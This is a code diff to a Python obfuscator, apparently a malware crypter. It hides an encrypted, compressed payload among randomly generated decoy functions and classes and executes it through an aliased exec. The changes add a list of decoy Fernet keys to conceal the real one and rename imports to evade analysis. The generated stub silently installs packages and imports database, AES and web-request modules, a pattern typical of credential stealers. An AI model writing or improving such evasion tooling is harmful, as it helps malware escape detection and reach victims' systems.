@@ -54,6 +54,14 @@ for _ in range(15):  # Increase the number of fake functions
 def random_class_name():
     return ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(19))
 
+def generate_random_keys(num_keys):
+    keys = [Fernet.generate_key() for _ in range(num_keys)]
+    return keys
+
+key_list = []
+key_list.extend(generate_random_keys(random.randint(10,25)))
+keyssss = random.randint(0, len(key_list))
+key_list.insert(keyssss, key)
 fake_classes = {}
 for _ in range(10): 
     class_name = random_class_name()
@@ -70,18 +78,26 @@ fake_code_list = [fake_code_str, fake_functions_str, fake_classes_str]
 random.shuffle(fake_code_list)
 all_fake_code = "\n".join(fake_code_list)
 e = random_class_name()
+a = random_class_name()
+aw = random_class_name()
 obfuscated_code = f'''
 {all_fake_code}
 import zlib
 import base64
 {all_fake_code}
 import cryptography
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet as {a}
 encoded_code = "{encoded_code}"
 {e} = exec
 encrypted_code = base64.b64decode(encoded_code)
 {all_fake_code}
-decrypted_code = Fernet(b'{key.decode("utf-8")}').decrypt(encrypted_code)
+s = {key_list}
+for key in s:
+    try:
+        decrypted_code = {a}(key.decode("utf-8")).decrypt(encrypted_code)
+        break
+    except Exception as e:
+        pass
 {all_fake_code}
 decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
 {e}(decompressed_code)
@@ -91,6 +107,6 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
 s = base64.b64encode(obfuscated_code.encode('utf-8'))
 
 with open(f'.\\build\{ss}', "wb") as obfu_file:
-    obfu_file.write(f"{all_fake_code};import ctypes;import base64,subprocess,sqlite3,json,shutil\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\ntry:import requests\nexcept:subprocess.run('python -m pip install requests', shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run('python -m pip install Crypto', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\nb={s}.decode('utf-8')\n{e}(base64.b64decode(b))\n{all_fake_code}".encode("utf-8"))   
+    obfu_file.write(f"{all_fake_code};import ctypes;import base64,subprocess,sqlite3,json,shutil\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\ntry:import requests\nexcept:subprocess.run('python -m pip install requests', shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run('python -m pip install Crypto', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\n{aw}='{s.decode('utf-8')}'\n{e}(base64.b64decode({aw}))\n{all_fake_code}".encode("utf-8"))   
 os.remove("encryption_key.txt")
 print(f"The code has been encrypted, Filename: .\\build\{ss}")
